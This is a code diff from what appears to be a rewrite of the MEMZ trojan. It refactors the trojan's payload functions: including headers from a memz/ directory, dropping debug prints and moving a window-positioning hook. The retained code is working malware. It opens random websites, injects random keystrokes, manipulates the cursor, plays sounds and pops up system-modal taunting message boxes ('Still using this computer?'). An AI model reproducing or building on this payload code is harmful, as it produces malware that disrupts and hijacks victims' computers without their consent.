@@ -1,14 +1,11 @@
-#include <payload_function.h>
-#include <data.h>
-#include <util.h>
-
-#include <stdio.h> //
+#include <memz/payload_function.h>
+#include <memz/data.h>
+#include <memz/util.h>
 
 
 void shell_execute(window_t* w)
 {
     ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % sites_size], NULL, NULL, SW_SHOWDEFAULT);
-    printf("shell_execute\n");
 }
 
 void keyboard_malfunction(window_t* w)
@@ -20,7 +17,6 @@ void keyboard_malfunction(window_t* w)
     input.ki.wVk = rnd;
 
     SendInput(1, &input, sizeof(INPUT));
-    printf("keyboard_malfunction\n");
 }
 
 void cursor_malfunction(window_t* w)
@@ -66,27 +62,9 @@ void play_sound(window_t* w)
     PlaySoundA(sounds[random() % sounds_size], GetModuleHandle(NULL), SND_SYNC);
 }
 
-static LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HCBT_CREATEWND) {
-        CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;
-
-        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
-            //HWND hwnd = (HWND)wParam;
-
-            int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
-            int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);
-
-            pcs->x = x;
-            pcs->y = y;
-        }
-    }
-
-    return CallNextHookEx(0, nCode, wParam, lParam);
-}
-
 static DWORD WINAPI messageBoxThread(LPVOID parameter)
 {
-    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
+    HHOOK hook = SetWindowsHookEx(WH_CBT, message_box_hook, 0, GetCurrentThreadId());
     MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
     UnhookWindowsHookEx(hook);
 
